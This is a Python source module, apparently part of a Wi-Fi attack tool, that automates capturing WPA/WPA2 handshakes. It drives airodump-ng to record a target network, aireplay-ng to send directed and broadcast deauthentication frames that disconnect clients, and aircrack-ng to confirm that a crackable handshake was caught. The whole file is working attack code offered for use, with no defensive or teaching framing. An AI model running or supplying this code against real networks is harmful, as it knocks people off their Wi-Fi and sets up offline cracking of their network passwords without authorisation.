# -*- coding: utf-8 -*-
"""WPA/WPA2 handshake capture — airodump-ng + aireplay-ng, structured detection.

No stdout scraping of a wrapper: airodump writes a pcap, and we confirm the
handshake by running aircrack-ng against it non-interactively.
"""
import os
import re
import subprocess
import time

import config
from attack import interface as iface_mod
from attack import tools
from attack.model import AttackEvent, EventType

# Settle before first deauth; broadcast only after this if still no clients.
_SETTLE_SEC = 3.0
_BROADCAST_GRACE_SEC = 8.0


def _safe(name):
    return re.sub(r"[^A-Za-z0-9_-]", "_", (name or "unknown"))[:24]


def _clients(csv_path, bssid):
    """Station MACs associated with `bssid` in airodump's live -01.csv."""
    try:
        with open(csv_path, encoding="utf-8", errors="ignore") as f:
            text = f.read()
    except OSError:
        return []
    idx = text.find("Station MAC")          # second section = associated clients
    if idx < 0:
        return []
    macs = []
    for line in text[idx:].splitlines()[1:]:
        parts = [p.strip() for p in line.split(",")]
        if len(parts) > 5 and parts[5].upper() == bssid.upper():
            macs.append(parts[0])
    return macs


def _ap_channel(csv_path, bssid):
    """Channel from airodump AP CSV row for `bssid`, or None."""
    try:
        with open(csv_path, encoding="utf-8", errors="ignore") as f:
            text = f.read()
    except OSError:
        return None
    idx = text.find("Station MAC")
    ap_text = text[:idx] if idx >= 0 else text
    for line in ap_text.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if not parts or parts[0].upper() != bssid.upper():
            continue
        if len(parts) > 3:
            try:
                ch = int(parts[3])
                if ch > 0:
                    return str(ch)
            except (ValueError, TypeError):
                pass
    return None


def _start_airodump(mon, bssid, prefix, channel):
    dump_cmd = [tools.AIRODUMP]
    if channel:
        dump_cmd += ["-c", str(channel)]
    dump_cmd += ["--bssid", bssid, "-w", prefix,
                 "--output-format", "pcap,csv", mon]
    tools.log("wpa capture: %s" % " ".join(dump_cmd))
    return subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)


def _stop_proc(proc):
    if not proc:
        return
    try:
        proc.terminate()
        proc.wait(timeout=3)
    except Exception:  # noqa: BLE001
        try:
            proc.kill()
        except Exception:  # noqa: BLE001
            pass


def _deauth_ok(res):
    """True only when aireplay appears to have sent frames."""
    if not res:
        return False
    out = ((res.stdout or "") + (res.stderr or "")).strip()
    if res.returncode != 0:
        return False
    if re.search(r"No such BSSID|fixed channel.*-1", out, re.I):
        return False
    # Timed out while still waiting for a beacon — nothing sent.
    if re.search(r"Waiting for beacon", out, re.I) and not re.search(
            r"Sending\s+\d+", out, re.I):
        return False
    return True


def _has_handshake(cap_path, bssid):
    """True if `cap_path` contains a WPA handshake for `bssid`.

    `-w /dev/null` gives aircrack a (empty) wordlist so it runs non-interactively
    and prints the handshake count in its network table instead of prompting.
    We do NOT pass `-b` — aircrack-ng asserts "ap_cur != NULL" when the target
    has no EAPOL frames, which hides the (legitimate) 0-handshake answer; parse
    the table row for our BSSID instead."""
    if not os.path.exists(cap_path):
        return False
    res = tools.run([tools.AIRCRACK, "-a", "2", "-w", "/dev/null", cap_path],
                    timeout=20)
    if not res:
        return False
    out = (res.stdout or "") + (res.stderr or "")
    want = (bssid or "").replace(":", "").upper()
    for line in out.splitlines():
        # Row format: "1  AA:BB:CC:DD:EE:FF  ESSID  WPA (1 handshake)".
        if not re.search(r"[1-9]\d*\s+handshake", line, re.I):
            continue
        if want and want not in line.replace(":", "").upper():
            continue
        return True
    return False


def capture(mon, target, req, emit, stop_flag):
    """Capture a handshake for one target.

    target: {"essid","bssid","channel"}. Returns {"ok","cap","essid","bssid"}.
    """
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    channel = str(target.get("channel") or "") or None
    os.makedirs(config.CAPTURE_DIR, exist_ok=True)
    prefix = os.path.join(config.CAPTURE_DIR, "%s_%s" % (_safe(essid),
                          bssid.replace(":", "")))
    cap = prefix + "-01.cap"
    csv = prefix + "-01.csv"
    signal = target.get("signal")
    # Clear stale captures for this prefix so -01 is fresh.
    for old in (cap, csv):
        try:
            os.remove(old)
        except OSError:
            pass

    timeout = config.opt_int(req.timing, "WPA Timeout", 300)
    deauth_on = config.opt_bool(req.attack_modes, "Deauth", True)
    deauth_gap = config.opt_int(req.timing, "Deauth Sec", 10)
    num_deauth = config.opt_int(req.timing, "Num Deauths", 5)

    dump = None
    try:
        # Discover channel via hopping airodump when scan left it empty —
        # never invent channel 1.
        if not channel:
            tools.log("wpa: no channel for %s — probing via airodump" % bssid)
            try:
                dump = _start_airodump(mon, bssid, prefix, None)
            except Exception as e:  # noqa: BLE001
                tools.log("airodump start failed: %s" % e)
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="airodump"))
                return {"ok": False, "essid": essid, "bssid": bssid}
            probe_deadline = time.time() + 8.0
            while time.time() < probe_deadline:
                if stop_flag and stop_flag.is_set():
                    return {"ok": False, "essid": essid, "bssid": bssid,
                            "cancelled": True}
                channel = _ap_channel(csv, bssid)
                if channel:
                    tools.log("wpa: discovered channel %s for %s" % (
                        channel, bssid))
                    target["channel"] = channel
                    break
                time.sleep(0.5)
            _stop_proc(dump)
            dump = None
            for old in (cap, csv):
                try:
                    os.remove(old)
                except OSError:
                    pass
            if not channel:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no channel"))
                return {"ok": False, "essid": essid, "bssid": bssid}

        iface_mod.lock_channel(mon, channel)
        try:
            dump = _start_airodump(mon, bssid, prefix, channel)
        except Exception as e:  # noqa: BLE001
            tools.log("airodump start failed: %s" % e)
            emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                             detail="airodump"))
            return {"ok": False, "essid": essid, "bssid": bssid}

        start = time.time()
        last_deauth = 0.0
        while True:
            if stop_flag and stop_flag.is_set():
                return {"ok": False, "essid": essid, "bssid": bssid,
                        "cancelled": True}
            elapsed = time.time() - start
            remaining = int(timeout - elapsed)
            if remaining <= 0:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="timeout"))
                return {"ok": False, "essid": essid, "bssid": bssid}

            clients = _clients(csv, bssid)
            settled = elapsed >= _SETTLE_SEC or bool(clients)
            if (deauth_on and deauth_gap and settled and
                    (time.time() - last_deauth) >= deauth_gap):
                # Prefer directed -c STA. Broadcast only after grace with no
                # clients — many modern STAs/APs ignore broadcast deauth.
                if clients:
                    targets = clients
                elif elapsed >= _BROADCAST_GRACE_SEC:
                    targets = [None]
                else:
                    targets = []
                sent = 0
                for client in targets:
                    cmd = [tools.AIREPLAY, "--ignore-negative-one",
                           "--deauth", str(num_deauth), "-a", bssid]
                    if client:
                        cmd += ["-c", client]
                    cmd.append(mon)
                    res = tools.run(cmd, timeout=12)
                    out = ""
                    if res:
                        out = ((res.stdout or "") + (res.stderr or "")).strip()
                        tools.log("deauth %s -> %s rc=%s: %s" % (
                            bssid, client or "broadcast",
                            res.returncode, out[-200:]))
                    else:
                        tools.log("deauth %s -> %s: timeout/fail" % (
                            bssid, client or "broadcast"))
                    if _deauth_ok(res):
                        sent += 1
                last_deauth = time.time()
                if sent:
                    emit(AttackEvent(EventType.DEAUTH, essid=essid, bssid=bssid,
                                     current=num_deauth))

            emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                             phase="HS", countdown=remaining, cd_max=timeout,
                             signal=signal, clients=len(clients)))

            if _has_handshake(cap, bssid):
                emit(AttackEvent(EventType.HANDSHAKE, essid=essid, bssid=bssid))
                return {"ok": True, "cap": cap, "essid": essid, "bssid": bssid,
                        "channel": channel}

            time.sleep(3)
    finally:
        _stop_proc(dump)
